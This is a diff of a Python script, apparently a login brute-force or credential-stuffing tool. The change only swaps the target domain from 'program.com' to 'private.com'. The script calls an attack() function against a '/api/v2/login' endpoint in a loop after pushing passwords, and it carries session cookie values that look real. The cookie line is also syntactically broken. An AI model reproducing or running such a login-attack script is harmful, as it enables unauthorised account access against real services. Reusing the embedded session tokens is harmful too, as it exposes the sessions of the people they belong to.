@@ -88,11 +88,11 @@ def attack(url):
                       "Accept": "application/json, text/plain, */*", 
                       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36", 
                       "Content-Type": "application/json;charset=UTF-8", 
-                      "Origin": "https://program.com", 
+                      "Origin": "https://private.com", 
                       "Sec-Fetch-Site": "same-site", 
                       "Sec-Fetch-Mode": "cors", 
                       "Sec-Fetch-Dest": "empty", 
-                      "Referer": "https://program.com/login", 
+                      "Referer": "https://private.com/login", 
                       " Accept-Encoding": "gzip, deflate", 
                       "Accept-Language": "en-US,en;q=0.9",
                       "Cookie " : "__cfduid": "dc7914404b4b8af17d2b615325ec94cbf1596976181", "connect.sid": "s%3Aqcg54CJ2isBko1u1YNhaPG0bhX9R9Wmi.8XeOBqwBtDjReQFjOwpK8s6AnRPVO4BJfghJClZEcio"}
@@ -113,7 +113,7 @@ def push_pass():
 
 def main():
    push_pass()
-   url = "https://api.program.com/api/v2/login"
+   url = "https://api.private.com/api/v2/login"
    for i in range(total):
        attack(url)
         
